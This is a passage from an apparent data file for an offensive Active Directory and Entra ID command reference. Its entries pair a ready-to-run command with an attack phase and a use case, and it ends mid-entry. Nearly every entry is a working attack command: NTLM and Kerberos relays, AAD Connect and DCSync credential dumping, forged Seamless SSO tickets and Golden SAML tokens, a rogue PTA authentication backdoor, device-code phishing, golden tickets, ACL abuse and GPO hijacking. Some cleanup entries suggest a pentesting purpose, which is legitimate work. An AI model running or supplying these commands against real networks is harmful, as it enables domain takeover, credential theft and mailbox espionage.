    command: "sudo ntlmrelayx.py -t imap://$TARGET -smb2support",
    description: "Relays NTLM authentication to an Exchange/mail server's IMAP interface, effectively giving read access to the victim's mailbox.",
    useCase: "Mailbox compromise without ever needing the victim's actual password — useful for both further phishing and pure espionage objectives.",
  },
  {
    id: "ntlmrelayx-smtp",
    tool: "Impacket (ntlmrelayx.py)",
    phase: "cred",
    title: "Relay NTLM auth to SMTP (send-as access)",
    command: "sudo ntlmrelayx.py -t smtp://$TARGET -smb2support",
    description: "Relays NTLM authentication to an SMTP interface that accepts Windows Integrated Auth, allowing the attacker to send mail as the relayed victim.",
    useCase: "Sending an internally-trusted phishing email 'from' a real, relayed employee account rather than a spoofed external one.",
  },
  {
    id: "ntlmrelayx-mssql",
    tool: "Impacket (ntlmrelayx.py)",
    phase: "cred",
    title: "Relay NTLM auth to MSSQL",
    command: "sudo ntlmrelayx.py -t mssql://$TARGET -smb2support",
    description: "Relays NTLM authentication straight into a SQL Server login session, landing you in mssqlclient-style access as the relayed account without cracking anything.",
    useCase: "Chaining a Responder/coercion capture directly into MSSQL access (and from there, xp_cmdshell) in one relay hop.",
  },

  // --- Restricted Groups GPO abuse (distinct from the scheduled-task method) ---
  {
    id: "sharpgpoabuse-restricted-groups",
    tool: "SharpGPOAbuse",
    phase: "privesc",
    title: "Abuse a writable GPO via Restricted Groups",
    command: "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $USER --GPOName 'VulnGPO'",
    description: "Uses the GPO's Restricted Groups mechanism (GptTmpl.inf) to add a principal to the local Administrators group on every computer the GPO applies to — a different, quieter mechanism than planting a scheduled task.",
    useCase: "Alternative to the scheduled-task GPO abuse method when a environment specifically monitors for new scheduled tasks but not Restricted Groups changes.",
  },

  // ============ ENTRA ID / HYBRID AD ============

  // --- Recon ---
  {
    id: "azurehound-userpass",
    tool: "AzureHound",
    phase: "recon",
    title: "Collect Entra ID data (username/password)",
    command: "azurehound -u $USER -p $PASS --tenant $DOMAIN list -o azure.json",
    description: "Collects users, groups, roles, apps, and their relationships from Entra ID, in the same graph format SharpHound uses for on-prem AD — ingest the output directly into BloodHound CE.",
    useCase: "The Entra ID/Azure equivalent of SharpHound — essential in any hybrid environment, since on-prem BloodHound data alone misses the cloud half of the attack surface.",
  },
  {
    id: "azurehound-refresh-token",
    tool: "AzureHound",
    phase: "recon",
    title: "Collect Entra ID data using a refresh token",
    command: "azurehound -r $HASH list --tenant $DOMAIN -o azure.json",
    description: "Same collection, authenticated with a stolen/captured refresh token instead of a password — reuses the $HASH field for the token value.",
    useCase: "Using a refresh token obtained via device-code phishing or token theft instead of needing a plaintext credential.",
  },
  {
    id: "roadrecon-gather",
    tool: "ROADtools (roadrecon)",
    phase: "recon",
    title: "Authenticate and gather Entra ID data",
    command: "roadrecon auth -u $USER -p $PASS\nroadrecon gather",
    description: "Authenticates to Entra ID and pulls users, groups, devices, applications, and directory roles into a local SQLite database for offline querying.",
    useCase: "Alternative to AzureHound with its own SQL-queryable data model and a built-in web GUI for browsing results.",
  },
  {
    id: "roadrecon-gui",
    tool: "ROADtools (roadrecon)",
    phase: "recon",
    title: "Browse collected data in the ROADrecon GUI",
    command: "roadrecon gui",
    description: "Launches a local web interface for browsing the gathered Entra ID data — users, groups, app registrations, and role assignments.",
    useCase: "Visual review of ROADrecon's collection without needing to write raw SQL against the database.",
  },
  {
    id: "aadinternals-recon-outsider",
    tool: "AADInternals",
    phase: "recon",
    title: "Recon a tenant with zero credentials",
    command: "Invoke-AADIntReconAsOutsider -Domain $DOMAIN | Format-Table",
    description: "Enumerates basic tenant info (tenant ID, authentication type, whether Seamless SSO/federation is in use) using only a domain name — no credentials required at all.",
    useCase: "First step before any hybrid-identity attack — confirms whether Seamless SSO or AD FS federation is even in play for this tenant.",
  },
  {
    id: "illicit-consent-enum",
    tool: "Get-AzureADPSPermissionGrants",
    phase: "recon",
    title: "Enumerate OAuth app permission grants",
    command: "Get-AzureADPSPermissionGrants.ps1 | Export-Csv -Path grants.csv -NoTypeInformation",
    description: "Lists every OAuth application registered in the tenant and the delegated/application permissions it's been granted, surfacing over-privileged or suspicious app registrations.",
    useCase: "Finding illicit consent grants — malicious apps a user was tricked into authorizing, which can retain access independent of that user's password.",
  },

  // --- Credential Access ---
  {
    id: "aadconnect-sync-creds",
    tool: "AADInternals",
    phase: "cred",
    title: "Dump the AAD Connect sync account credentials",
    command: "Get-AADIntSyncCredentials",
    description: "Extracts the ADSync/AAD Connect service account's credentials from the local configuration database — run with local admin on the AAD Connect server itself.",
    useCase: "The AAD Connect sync account holds Replicating Directory Changes rights on-prem by default — recovering its credentials is a direct path to DCSync.",
  },
  {
    id: "aadconnect-dcsync",
    tool: "Impacket (secretsdump.py)",
    phase: "cred",
    title: "DCSync using the recovered sync account",
    command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc",
    description: "Uses the AAD Connect sync account's credentials (recovered in the previous step) to DCSync the on-prem domain — the account's default rights make this work out of the box.",
    useCase: "Turns local admin on a single AAD Connect server into full on-prem domain compromise, with no BloodHound edge required to justify it since the rights are a default artifact of the sync account's setup.",
  },
  {
    id: "ssoacc-hash-dump",
    tool: "Impacket (secretsdump.py)",
    phase: "cred",
    title: "Dump the AZUREADSSOACC$ computer account hash",
    command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user 'AZUREADSSOACC$'",
    description: "The AZUREADSSOACC$ computer account's Kerberos key is shared with Entra ID to validate Seamless SSO tickets — dumping it only requires DCSync-equivalent rights on-prem.",
    useCase: "First step toward forging Entra ID sign-ins entirely from an on-prem foothold, bypassing MFA since Seamless SSO is designed to be silent.",
  },
  {
    id: "seamlesssso-forge-ticket",
    tool: "AADInternals",
    phase: "cred",
    title: "Forge a Seamless SSO Kerberos ticket",
    command: "$kerberos = New-AADIntKerberosTicket -SidString $SID -Hash $HASH",
    description: "Forges a Kerberos silver ticket for the Seamless SSO service (autologon.microsoftazuread-sso.com) using the AZUREADSSOACC$ hash and the target user's on-prem SID — no domain controller contact needed.",
    useCase: "The forging step of the Seamless SSO attack chain; the resulting ticket is exchanged for a real Entra ID access token in the next step.",
  },
  {
    id: "seamlesssso-get-token",
    tool: "AADInternals",
    phase: "cred",
    title: "Exchange the forged ticket for an Entra ID access token",
    command: "Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain $DOMAIN",
    description: "Submits the forged Kerberos ticket to Entra ID, which validates it using the shared AZUREADSSOACC$ key and issues a genuine access token for the impersonated user.",
    useCase: "Full Entra ID access as any synced user — including Global Admins — from a purely on-prem starting point, bypassing MFA since Seamless SSO doesn't prompt for it.",
  },
  {
    id: "device-code-phishing",
    tool: "TokenTactics",
    phase: "cred",
    title: "Device code phishing for Entra ID tokens",
    command: "Invoke-DeviceCodeFlow -Client Graph",
    description: "Generates a legitimate Microsoft device-code login URL and code, then polls in the background until the phished user completes the (real, unmodified) Microsoft login flow — no credential harvesting page needed at all.",
    useCase: "A phishing pretext that never touches a fake login page, since the victim genuinely authenticates on microsoft.com — often bypasses security awareness training built around spotting spoofed login pages.",
  },

  // --- Persistence ---
  {
    id: "pta-backdoor",
    tool: "AADInternals",
    phase: "persist",
    title: "Plant a rogue Pass-through Authentication agent",
    command: "Install-AADIntPTASpy",
    description: "Installs a malicious PTA (Pass-through Authentication) agent that intercepts and logs every authentication attempt made against it — and can be configured to approve any password as valid, regardless of the real one.",
    useCase: "Extremely stealthy hybrid-identity persistence — approves attacker-chosen credentials as valid Entra ID sign-ins while continuing to relay/log real employee logins normally.",
  },
  {
    id: "goldensaml-extract-cert",
    tool: "Mimikatz",
    phase: "persist",
    title: "Extract the AD FS token-signing certificate",
    command: "misc::adfs",
    description: "Run on a live AD FS server (as the account running the AD FS service, or SYSTEM), extracts the private token-signing certificate directly from the running process — the same key material an attacker could also reach via the DKM container (see CVE-2026-56155).",
    useCase: "The prerequisite for Golden SAML — once you have this certificate, you no longer need any further access to the AD FS server at all.",
  },
  {
    id: "goldensaml-forge-token",
    tool: "AADInternals",
    phase: "persist",
    title: "Forge a Golden SAML token",
    command: "New-AADIntSAMLToken -ImmutableID $HASH -Certificate cert.pfx -Issuer 'http://$DC/adfs/services/trust'",
    description: "Signs a fully valid SAML authentication token for any user (identified by their ImmutableID) entirely offline, using the stolen AD FS token-signing certificate — Entra ID accepts it as if AD FS itself issued it.",
    useCase: "Domain-wide-equivalent persistence into every application trusting this AD FS instance, including Microsoft 365 — survives password resets and even krbtgt rotation, since it doesn't touch Kerberos at all. Only revoking/rotating the AD FS certificate closes this.",
  },

  // --- Privilege Escalation (gMSA write primitive) ---
  {
    id: "gmsa-add-principal",
    tool: "Set-ADServiceAccount",
    phase: "privesc",
    title: "Add yourself as an authorized gMSA password reader",
    command: "Set-ADServiceAccount -Identity $TARGETOBJECT -PrincipalsAllowedToRetrieveManagedPassword $USER",
    description: "If you hold write access to a gMSA object (GenericWrite/GenericAll — see the Attack Paths tab), you can add yourself to the list of principals authorized to read its managed password, without needing the KDS root key at all.",
    useCase: "The simpler, targeted cousin of Golden gMSA — compromises one specific gMSA you already have write access to, rather than every gMSA in the domain.",
  },


  // ============ CLEANUP / ANTI-FORENSICS ============

  {
    id: "cleanup-shadow-creds",
    tool: "Certipy",
    phase: "evasion",
    title: "Remove a planted Shadow Credential",
    command: "certipy shadow remove -u $USER@$DOMAIN -p $PASS -account $TARGETOBJECT -device-id <ID-from-add-output> -dc-ip $DC",
    description: "Removes the specific key credential entry added by an earlier `certipy shadow auto`/`add`, using the device ID printed when it was planted — leaves the rest of the account's msDS-KeyCredentialLink untouched.",
    useCase: "Cleaning up after testing Shadow Credentials so the account doesn't retain an attacker-controlled authentication key once the engagement ends.",
  },
  {
    id: "cleanup-rbcd",
    tool: "Impacket (rbcd.py)",
    phase: "evasion",
    title: "Remove a planted RBCD configuration",
    command: "rbcd.py -delegate-to '$TARGETOBJECT$' -delegate-from 'ATTACKER$' -action remove $DOMAIN/$USER:$PASS",
    description: "Removes the delegation entry added by an earlier `rbcd.py -action write`, restoring msDS-AllowedToActOnBehalfOfOtherIdentity to its prior state.",
    useCase: "Reverting an RBCD self-grant once testing is complete — leaving it in place means anyone who later compromises the same source computer account inherits the same delegation path.",
  },
  {
    id: "cleanup-dacl-restore",
    tool: "Impacket (dacledit.py)",
    phase: "evasion",
    title: "Restore an object's original DACL",
    command: "dacledit.py -action restore -restore-file dacl-backup.bak $DOMAIN/$USER:$PASS",
    description: "Restores an object's ACL from a backup file — always run `dacledit.py -action backup` before writing any ACE, so there's something to restore from afterward.",
    useCase: "Reverting a WriteDacl/Owns abuse chain cleanly, rather than leaving an attacker-added GenericAll ACE in place indefinitely.",
  },
  {
    id: "cleanup-esc4-template",
    tool: "Certipy",
    phase: "evasion",
    title: "Restore a certificate template's original configuration",
    command: "certipy template -u $USER@$DOMAIN -p $PASS -dc-ip $DC -template 'VulnTemplate' -write-configuration 'VulnTemplate.json' -no-save",
    description: "Restores a certificate template to the configuration automatically saved by the earlier `certipy template -write-default-configuration` call, undoing the ESC1-style reconfiguration used to demonstrate ESC4 (Certipy v5 flag names — older versions used -save-old/-configuration).",
    useCase: "Never leave a certificate template in its exploited state after an ESC4 demonstration — this is a standing, silent privilege-escalation path for anyone else who finds it.",
  },
  {
    id: "cleanup-computer-account",
    tool: "Remove-ADComputer",
    phase: "evasion",
    title: "Remove a computer account created for testing",
    command: "Remove-ADComputer -Identity 'ATTACKERPC$' -Confirm:$false",
    description: "Deletes a computer account created via MachineAccountQuota abuse (addcomputer.py, Certifried setup, RBCD source accounts, etc.) during testing.",
    useCase: "Machine accounts created for a specific technique demonstration are easy to forget about — each one left behind is a small standing foothold.",
  },
  {
    id: "cleanup-reenable-account",
    tool: "Enable-ADAccount",
    phase: "evasion",
    title: "Re-enable an account disabled during testing",
    command: "Enable-ADAccount -Identity $TARGETOBJECT",
    description: "Re-enables an account that was disabled as part of a technique demonstration or safety measure during testing.",
    useCase: "Restoring normal business operations for the account owner once the relevant test is complete.",
  },


  // ============ SCCM DEEPER / DNS WILDCARD / RODC ============

  {
    id: "sccmhunter-relay",
    tool: "SCCMHunter",
    phase: "privesc",
    title: "Coerce and relay to an SCCM site server",
    command: "sccmhunter.py relay -u $USER -p $PASS -d $DOMAIN -ip $DC",
    description: "Coerces authentication from an SCCM site server and relays it to gain site-level administrative access, similar in spirit to PetitPotam/ADCS relay chains but targeting SCCM's own machine account trust.",
    useCase: "A direct path to Full Administrator on the SCCM console when the site server can be coerced — from there, SCCM's own reach into every managed endpoint becomes the attacker's.",
  },
  {
    id: "sharpsccm-adminservice-exec",
    tool: "SharpSCCM",
    phase: "lateral",
    title: "Execute code on a managed device via the AdminService API",
    command: "SharpSCCM.exe exec -d $TARGETOBJECT -sms-provider $TARGET -payload cmd.exe",
    description: "Uses SCCM's AdminService REST API (rather than the console) to push and execute a payload on any device the site manages — legitimate SCCM functionality being used offensively.",
    useCase: "Once you hold SCCM administrative rights, this reaches every device SCCM manages — often far more machines than any single compromised host's local admin rights would.",
  },
  {
    id: "dnstool-wildcard",
    tool: "dnstool.py (krbrelayx)",
    phase: "privesc",
    title: "Add a wildcard DNS record for relay setups",
    command: "dnstool.py -u $DOMAIN\\$USER -p $PASS --action add --record '*' --data $ATTACKER --type A $DC",
    description: "Writes a wildcard A record to AD-integrated DNS, pointing every unresolved hostname query in the zone at the attacker's IP — abuses the fact that authenticated users can create DNS records by default.",
    useCase: "Setting up a broad NTLM-relay collection point without needing to know specific target hostnames in advance — any client that mistypes or queries a nonexistent host lands on the attacker.",
  },
  {
    id: "dnstool-wildcard-cleanup",
    tool: "dnstool.py (krbrelayx)",
    phase: "evasion",
    title: "Remove a planted wildcard DNS record",
    command: "dnstool.py -u $DOMAIN\\$USER -p $PASS --action remove --record '*' --type A $DC",
    description: "Removes the wildcard A record planted for a relay setup, restoring normal DNS resolution behavior for the zone.",
    useCase: "A wildcard DNS record left in place after testing silently breaks normal name resolution for any client requesting a hostname that doesn't exist — always clean this up.",
  },

  // ============ KERBEROS RELAY ============
  {
    id: "krbrelayx-adcs-dns-poison",
    tool: "krbrelayx",
    phase: "lateral",
    title: "Relay a Kerberos AP-REQ to ADCS web enrollment (via mitm6/DNS)",
    command: "krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER --victim $TARGETOBJECT --adcs --template Machine",
    description: "Waits for an incoming Kerberos authentication (obtained via a mitm6 DNS-poisoning SOA/TKEY exchange) and relays the AP-REQ to AD CS's HTTP web enrollment endpoint, requesting a Machine certificate on the victim's behalf — HTTP doesn't enforce Kerberos signing the way LDAP does, which is what makes this relay viable at all.",
    useCase: "Kerberos-only environments (NTLM disabled, or the client is in Protected Users) where an NTLM relay to ESC8 wouldn't work, but a DNS-poisoned Kerberos relay still does.",
  },
  {
    id: "mitm6-krbrelay-dns-poison",
    tool: "mitm6",
    phase: "lateral",
    title: "Poison DNS to feed a Kerberos relay (pair with krbrelayx)",
    command: "mitm6 -i $ATTACKER -d $DOMAIN -hw $TARGET --relay $ADCS_FQDN -v",
    description: "Advertises itself as the network's IPv6 DNS server so the victim's dynamic-DNS-update SOA/TKEY exchange gets intercepted, forcing it to Kerberos-authenticate to the attacker instead of the real DC — the resulting AP-REQ is what krbrelayx (running in a second terminal) then relays onward.",
    useCase: "Setting up the DNS-poisoning half of a Kerberos relay chain to ADCS/SCCM when NTLM is unavailable or restricted.",
  },
  {
    id: "krbrelayx-smb-dump",
    tool: "krbrelayx",
    phase: "cred",
    title: "Relay a Kerberos AP-REQ to unsigned SMB",
    command: "krbrelayx.py -t smb://$TARGET",
    description: "Relays a captured Kerberos AP-REQ straight to an unsigned SMB service — if the relayed identity holds local admin there, SAM/LSA secrets can be dumped immediately, the same payoff as an unsigned-SMB NTLM relay.",
    useCase: "Cashing in a Kerberos relay against SMB when the target of the relay (not the coerced victim) doesn't enforce SMB signing.",
  },
  {
    id: "dnstool-spn-spoof-record",
    tool: "dnstool.py (krbrelayx)",
    phase: "lateral",
    title: "Register a DNS record that spoofs a coerced SPN's target",
    command: "dnstool.py -u $DOMAIN\\$USER -p $PASS -r \"[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" -d $ATTACKER --action add $DC --tcp",
    description: "Registers an ADIDNS record whose name is the target NetBIOS name plus a Base64-encoded minimal CREDENTIAL_TARGET_INFORMATION structure — a coerced client building an SPN like cifs/target will resolve and connect to this record instead, while still Kerberos-authenticating with an AP-REQ for the original SPN's identity.",
    useCase: "Setting up the DNS half of a coerced Kerberos relay (e.g. toward an ADCS/PKI host) — any authenticated user can normally create this ADIDNS record by default.",
  },
  {
    id: "coercer-to-spoofed-record",
    tool: "Coercer",
    phase: "lateral",
    title: "Coerce authentication toward a spoofed DNS record",
    command: "coercer coerce -t $TARGET -l \"[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" -u $USER -p $PASS -d $DOMAIN",
    description: "Forces the target to authenticate toward the spoofed DNS record just registered instead of the real relay target's name, producing a Kerberos AP-REQ that krbrelayx (listening on the attacker host) can then relay onward — e.g. to the ADCS HTTP enrollment endpoint.",
    useCase: "Turning any standard coercion primitive into a Kerberos (rather than NTLM) relay, useful specifically when NTLM is restricted but the coerced service still accepts Kerberos.",
  },
  {
    id: "responder-spoof-answer-name",
    tool: "Responder",
    phase: "lateral",
    title: "Spoof the LLMNR answer name to redirect a Kerberos SPN request",
    command: "sudo responder -I $INTERFACE -N $TARGETOBJECT",
    description: "Answers LLMNR/mDNS/NBT-NS resolution failures with a response whose name differs from the query — pointing an HTTP client's failed lookup at the attacker's IP while making it request a service ticket for an arbitrary relay target's SPN instead of its own hostname, since Kerberos SPN construction trusts the DNS response name over the original query.",
    useCase: "Relaying pre-authenticated Kerberos HTTP auth (e.g. to ADCS web enrollment) purely from a poisoned name-resolution failure, no coercion vulnerability required.",
  },
  {
    id: "unicode-krbrelay-dns-record",
    tool: "dnstool.py (krbrelayx)",
    phase: "lateral",
    title: "CVE-2025-58726/2026-26128 — register a Unicode-lookalike DNS record",
    command: "dnstool.py -u $DOMAIN\\$USER -p $PASS $DC --action add -r \"[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]\" -d $ATTACKER",
    description: "Registers a hostname built from Unicode lookalike characters (e.g. Ⓡ U+24C7 in place of R) that LDAP's SPN matching normalizes as identical to the real target, while Windows' loopback-detection logic (CompareStringW, case-insensitive only) does not — the mismatch this CVE pair patched in March 2026.",
    useCase: "Setting up the Kerberos reflective-relay bypass on an unpatched host — note the modified krbrelayx build needed to actually relay the resulting AP-REQ was not publicly released at time of writing; this reflects the documented attack flow, not a turnkey public exploit.",
  },
  {
    id: "unicode-krbrelay-coerce",
    tool: "PetitPotam",
    phase: "lateral",
    title: "CVE-2025-58726/2026-26128 — coerce auth toward the Unicode FQDN",
    command: "petitpotam.py -u $USER -p $PASS -d $DOMAIN \"[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]\" $TARGET",
    description: "Coerces the target machine into authenticating toward the registered Unicode-lookalike hostname instead of its own real name, producing the Kerberos AP-REQ that a modified krbrelayx would relay back to the originating machine — a reflective relay, same class of impact as the earlier NTLM loopback bypasses.",
    useCase: "Same caveat as the DNS-registration step: this is the documented attack flow from Synacktiv's research, not something fully executable with public tooling as of this writing.",
  },
  {
    id: "unicode-krbrelay-cleanup",
    tool: "dnstool.py (krbrelayx)",
    phase: "evasion",
    title: "Remove a Unicode-lookalike relay DNS record",
    command: "dnstool.py -u $DOMAIN\\$USER -p $PASS $DC --action remove -r \"[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]\" --tcp",
    description: "Cleans up the Unicode-lookalike DNS record after testing, the same way any other planted relay/ADIDNS record should be removed once finished.",
    useCase: "Leaving a homoglyph DNS record in place is both an unnecessary persistence artifact and a dead giveaway on review — always remove it.",
  },

  {
    id: "rodc-secretsdump",
    tool: "Impacket (secretsdump.py)",
    phase: "cred",
    title: "DCSync an RODC (partial secrets only)",
    command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc",
    description: "Run against a Read-Only Domain Controller specifically, this only returns credentials for accounts in that RODC's Allowed RODC Password Replication Group — a much smaller set than a full DC would return, by design.",
    useCase: "Checking exactly which accounts an RODC has cached — useful both offensively (targeting a branch-office RODC) and defensively (auditing that a compromised RODC's blast radius was actually limited as intended).",
  },
  {
    id: "rodc-own-krbtgt-dump",
    tool: "Impacket (secretsdump.py)",
    phase: "cred",
    title: "Dump an RODC's own krbtgt account hash",
    command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user $TARGETOBJECT",
    description: "Every RODC gets its own dedicated krbtgt account (krbtgt_<number>), separate from the domain-wide krbtgt — fill $TARGETOBJECT with that account's name. Once you hold local admin/DSRM on the RODC itself, this pulls a fully usable ticket-forging hash.",
    useCase: "Turning local compromise of a single branch-office RODC into a ticket-forging key, without ever touching the domain's real krbtgt account.",
  },
  {
    id: "rodc-golden-ticket",
    tool: "Mimikatz",
    phase: "persist",
    title: "Forge a golden ticket scoped to a compromised RODC",
    command: "kerberos::golden /user:administrator /domain:$DOMAIN /sid:$SID /krbtgt:$HASH /ptt",
    description: "Identical golden-ticket forging as a normal krbtgt compromise, but signed with an RODC's own krbtgt hash instead of the domain's real one — writable DCs only trust their own krbtgt key, so this ticket is honored solely by that RODC, not the wider domain.",
    useCase: "Quiet, narrowly-scoped persistence on a compromised RODC that survives a domain-wide krbtgt rotation, since the RODC's own krbtgt key rotates independently of the domain's.",
  },
  {
    id: "powerviewpy-connect",
    tool: "PowerView.py (aniqfakhrul)",
    phase: "privesc",
    title: "Connect to an interactive LDAP shell (Linux)",
    command: "powerview \"$DOMAIN\"/\"$USER\":\"$PASS\"@\"$TARGET\"",
    description: "A from-scratch Python reimplementation of classic PowerShell PowerView, exposing the same Get-/Set-/Add-DomainObject-style cmdlet syntax inside an interactive shell — not to be confused with the PowerSploit PowerView module already covered elsewhere.",
    useCase: "Running familiar PowerView-style LDAP object edits from a Linux attack host, without needing a Windows box or the PowerShell module staged.",
  },
  {
    id: "powerviewpy-rodc-reveal-set",
    tool: "PowerView.py (aniqfakhrul)",
    phase: "privesc",
    title: "Add a target account to an RODC's msDS-RevealOnDemandGroup",
    command: "Set-DomainObject -Identity 'RODC-server$' -Set @{'msDS-RevealOnDemandGroup'='CN=Administrator,CN=Users,DC=domain,DC=local'}",
    description: "Run inside the PowerView.py shell once connected — overwrites the RODC's msDS-RevealOnDemandGroup to include the target account, making it eligible to have its credentials cached and replicated to that RODC.",
    useCase: "The first step of turning ACL control over an RODC's computer object into a path toward that target account's actual credentials.",
  },
  {
    id: "powerviewpy-rodc-reveal-append",
    tool: "PowerView.py (aniqfakhrul)",
    phase: "privesc",
    title: "Append the Allowed RODC Password Replication Group",
    command: "Set-DomainObject -Identity 'RODC-server$' -Append @{'msDS-RevealOnDemandGroup'='CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local'}",
    description: "Adds the built-in Allowed RODC Password Replication Group back into msDS-RevealOnDemandGroup alongside the newly added target — keeping the RODC's normal caching behavior intact instead of replacing it outright.",
    useCase: "Avoiding collateral changes to which ordinary accounts the RODC already caches, while still adding the new target.",
  },
  {
    id: "powerviewpy-rodc-neverreveal-clear",
    tool: "PowerView.py (aniqfakhrul)",
    phase: "privesc",
    title: "Clear msDS-NeverRevealGroup if it blocks the target",
    command: "Set-DomainObject -Identity 'RODC-server$' -Clear msDS-NeverRevealGroup",
    description: "msDS-NeverRevealGroup takes priority over msDS-RevealOnDemandGroup — if the target account (or a group it belongs to) is listed there, it must be cleared or the reveal-group addition above has no effect.",
    useCase: "Removing the explicit deny-list that would otherwise silently block the whole technique.",
  },
  {
    id: "bloodyad-rodc-reveal-read",
    tool: "bloodyAD",
    phase: "recon",
    title: "Read an RODC's current msDS-RevealOnDemandGroup value",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object $TARGETOBJECT --attr msDS-RevealOnDemandGroup",
    description: "Reads the RODC computer object's current msDS-RevealOnDemandGroup membership before modifying it, so the existing value (usually just the Allowed RODC Password Replication Group) can be preserved alongside the new addition.",
    useCase: "Checking what's already there before overwriting it, since bloodyAD's set requires listing every value you want to keep.",
  },
  {
    id: "bloodyad-rodc-reveal-set",
    tool: "bloodyAD",
    phase: "privesc",
    title: "Add a target account to an RODC's msDS-RevealOnDemandGroup",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'",
    description: "The Linux/bloodyAD equivalent of the PowerView.py -Set/-Append pair — writes both the original value and the new target account in one call, since bloodyAD's set replaces the full attribute rather than appending.",
    useCase: "Making a Domain Admin account eligible for credential caching on an RODC you have ACL control over, without needing PowerView.py staged.",
  },
  {
    id: "bloodyad-rodc-neverreveal-clear",
    tool: "bloodyAD",
    phase: "privesc",
    title: "Clear an RODC's msDS-NeverRevealGroup",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT --attr msDS-NeverRevealGroup",
    description: "Clears the deny-list attribute (by setting it with no values) if the target account or one of its groups was explicitly excluded there — msDS-NeverRevealGroup otherwise overrides msDS-RevealOnDemandGroup entirely.",
    useCase: "Removing the one thing that would silently block the reveal-group addition from taking effect.",
  },

  // ============ POWERVIEW / NATIVE AD MODULE ============

  {
    id: "powerview-kerberoast-enum",
    tool: "PowerView",
    phase: "recon",
    title: "Find Kerberoastable users",
    command: "Get-DomainUser -SPN",
    description: "Lists every user account with an SPN set — PowerView's native equivalent to nxc/Rubeus kerberoast enumeration.",
    useCase: "Kerberoast target discovery when PowerView is already loaded and a separate tool isn't worth staging.",
  },
  {
    id: "powerview-invoke-kerberoast",
    tool: "PowerView",
    phase: "cred",
    title: "Kerberoast in one PowerView command",
    command: "Invoke-Kerberoast | Export-Csv -NoTypeInformation kerberoast.csv",
    description: "Requests and dumps crackable TGS hashes for every SPN account in hashcat format, in a single PowerView call.",
    useCase: "Full kerberoast without leaving a PowerView session for Rubeus or GetUserSPNs.py.",
  },
  {
    id: "powerview-asreproast-enum",
    tool: "PowerView",
    phase: "recon",
    title: "Find AS-REP roastable users",
    command: "Get-DomainUser -UACFilter DONT_REQ_PREAUTH",
    description: "Filters directly on the userAccountControl flag for pre-auth-disabled accounts — PowerView's native AS-REP roast target discovery.",
    useCase: "Same target set Rubeus asreproast or GetNPUsers.py would find, without switching tools.",
  },
  {
    id: "powerview-add-domainobjectacl",
    tool: "PowerView",
    phase: "privesc",
    title: "Grant yourself a right via ACL write (DCSync, GenericAll, etc.)",
    command: "Add-DomainObjectAcl -TargetIdentity $TARGETOBJECT -PrincipalIdentity $USER -Rights DCSync",
    description: "PowerView's flagship ACL-abuse command — writes a new ACE granting the specified right (DCSync, GenericAll, WriteMembers, ResetPassword, All, and more) to a principal on any target object, given WriteDacl or ownership.",
    useCase: "The single most iconic PowerView command for turning WriteDacl/Owns into a concrete right — e.g. granting yourself DCSync directly on the domain object.",
  },
  {
    id: "powerview-add-groupmember",
    tool: "PowerView",
    phase: "privesc",
    title: "Add a member to a group",
    command: "Add-DomainGroupMember -Identity $TARGETOBJECT -Members $USER",
    description: "PowerView's native group-membership write, given AddMember/GenericWrite/GenericAll on the group.",
    useCase: "Windows-native alternative to bloodyAD/nxc group-membership writes when PowerView is already the tool in hand.",
  },
  {
    id: "powerview-set-userpassword",
    tool: "PowerView",
    phase: "cred",
    title: "Reset a user's password",
    command: "Set-DomainUserPassword -Identity $TARGETOBJECT -AccountPassword (ConvertTo-SecureString '$PASS' -AsPlainText -Force)",
    description: "PowerView's ForceChangePassword-style reset — sets a new password on a target account given the right rights, without needing the old one.",
    useCase: "Windows-native alternative to bloodyAD's set password / Impacket's changepasswd.py.",
  },
  {
    id: "powerview-set-objectowner",
    tool: "PowerView",
    phase: "privesc",
    title: "Take ownership of an object",
    command: "Set-DomainObjectOwner -Identity $TARGETOBJECT -OwnerIdentity $USER",
    description: "PowerView's WriteOwner abuse primitive — changes an object's owner to the specified principal, given WriteOwner rights.",
    useCase: "Windows-native alternative to bloodyAD's set owner / Impacket's owneredit.py — the usual first step before granting yourself further rights via Add-DomainObjectAcl.",
  },
  {
    id: "powerview-shadowcreds",
    tool: "PowerView",
    phase: "cred",
    title: "Plant Shadow Credentials via raw attribute write",
    command: "Set-DomainObject -Identity $TARGETOBJECT -Set @{'msDS-KeyCredentialLink'='$OUTFILE'}",
    description: "Writes a pre-generated key credential blob directly into msDS-KeyCredentialLink using PowerView's generic object-set capability, rather than a dedicated Shadow Credentials tool.",
    useCase: "Windows-native alternative when Certipy/Whisker aren't staged but PowerView is — the blob itself still needs generating separately.",
  },
  {
    id: "powerview-gpo-hijack",
    tool: "PowerView",
    phase: "privesc",
    title: "Redirect a GPO's file path (raw attribute abuse)",
    command: "Set-DomainObject -Identity $TARGETOBJECT -Set @{gPCFileSysPath='\\\\$ATTACKER\\share\\malicious.pol'}",
    description: "Points an existing GPO's gPCFileSysPath at an attacker-controlled SYSVOL-style share, so computers applying that GPO pull policy from the attacker instead — a different mechanism than SharpGPOAbuse's scheduled-task approach.",
    useCase: "Alternative GPO abuse path when you hold write access to the GPO object itself, bypassing the need for a scheduled-task-specific tool.",
  },
  {
    id: "native-set-adaccountpassword",
    tool: "Set-ADAccountPassword",
    phase: "cred",
    title: "Reset a password using the native AD module",
